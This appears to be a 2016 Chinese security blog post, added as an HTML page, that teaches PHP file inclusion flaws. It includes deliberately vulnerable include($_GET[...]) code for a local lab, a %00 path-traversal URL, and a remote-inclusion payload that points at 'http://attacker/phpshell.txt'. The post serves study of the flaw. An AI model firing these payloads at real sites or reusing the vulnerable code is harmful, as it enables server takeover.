@@ -1,0 +1,159 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>文件包含漏洞 | liuqi</title>
+  <meta name="author" content="liuqi">
+  
+  <meta name="description" content="吃吃睡睡终其一生">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="文件包含漏洞"/>
+  <meta property="og:site_name" content="liuqi"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="liuqi" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">liuqi</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2016-07-30T12:58:16.000Z"><a href="/2016/07/30/文件包含漏洞/">2016-07-30</a></time>
+      
+      
+  
+    <h1 class="title">文件包含漏洞</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p><strong>原理</strong><br>传入的文件名没有经过合理的校验，或者被过滤，从而操作了预想之外的文件，就可以导致文件泄露甚至恶意的代码注入<br><strong>漏洞分类</strong><br><strong>本地文件包含</strong><br>  上传木马，包含<br>  读文件<br>  日志文件<br>   phpinfo可以包含临时文件<br><strong>远程文件包含</strong><br>  保证php.ini中allow_url_fopen和 allow_url_include打开<br><strong>常见的文件包含的函数</strong><br>        include()                 发生错误时继续执行   用到时加载<br>     include_once()包含一次<br>     require()输出错误信息，终止程序运行，一开始就加载<br>    require_once()程序只调用一次   表示已加载的不加载<br><strong>利用条件</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">用户能够控制该动态变量</div><div class="line">**漏洞危害**</div><div class="line">执行任意代码</div><div class="line">包含恶意文件控制网站</div><div class="line">甚至控制服务器</div></pre></td></tr></table></figure></p>
+<p>看到参数，校验不严格，存在文件包含漏洞<br>&lt;?<br>$a=$_GET[‘file’];<br>include($a);<br>?&gt;<br>触发条件是include()<br>用这个代码搭建一个自己的环境<br><strong>本地文件包含</strong><br>   因为没有做过过滤，可以执行<br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/9/1.png?raw=true" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if ($_GET[&apos;page&apos;]) &#123; </div><div class="line">include &quot;./action/&quot;.$_GET[&apos;page&apos;].&quot;.php&quot;; </div><div class="line">&#125; else &#123; </div><div class="line">include &quot;./action/show.php&quot;; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>这个文件是%00截断<br><code>http://127.0.0.1:8088/dome/include.php?page=../../phpinfo.php%00</code><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/9/2.png?raw=true" alt="image"></p>
+<p>#远程文件包含<br>php.ini中allow_url_include=ON<br>如: require_once $basePath.’/action/m_share.php’<br>构造:/?param=<a href="http://attacker/phpshell.txt?" target="_blank" rel="external">http://attacker/phpshell.txt?</a>  注意?用来使后面变为一个查询值，起到截断作用，亦或者用%00截断<br><a href="http://127.0.0.1:8088/dome/include.php?file=http://www.dlam.ml/" target="_blank" rel="external">http://127.0.0.1:8088/dome/include.php?file=http://www.dlam.ml/</a><br><img src="https://github.com/chuntiandechun/chuntiandechun.github.io/blob/master/archives/9/3.png?raw=true" alt="image"><br>  <strong>文件包含漏洞的实列</strong><br>找了好久都没有找到文件包含的实列<br>用别人的吧<br>读取一些信息</p>
+<p>但是好像并不能远程文件包含</p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+        
+  <div class="addthis addthis_toolbox addthis_default_style">
+    
+      <a class="addthis_button_facebook_like" fb:like:layout="button_count"></a>
+    
+    
+      <a class="addthis_button_tweet"></a>
+    
+    
+      <a class="addthis_button_google_plusone" g:plusone:size="medium"></a>
+    
+    
+      <a class="addthis_button_pinterest_pinit" pi:pinit:layout="horizontal"></a>
+    
+    <a class="addthis_counter addthis_pill_style"></a>
+  </div>
+  <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js"></script>
+
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+<section id="comment">
+  <h1 class="title">Kommentare</h1>
+
+  
+      <div id="fb-root"></div>
+<script>
+  (function(d, s, id) {
+    var js, fjs = d.getElementsByTagName(s)[0];
+    if (d.getElementById(id)) return;
+    js = d.createElement(s); js.id = id;
+    js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=123456789012345";
+    fjs.parentNode.insertBefore(js, fjs);
+  }(document, 'script', 'facebook-jssdk'));
+</script>
+
+<div class="fb-comments" data-href="http://yoursite.com/2016/07/30/文件包含漏洞/index.html" data-num-posts="5" data-width="840" data-colorscheme="light"></div>
+      
+  
+</section>
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Suche">
+    <input type="hidden" name="q" value="site:yoursite.com">
+  </form>
+</div>
+
+  
+
+  
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2016 liuqi
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+</body>
+</html>
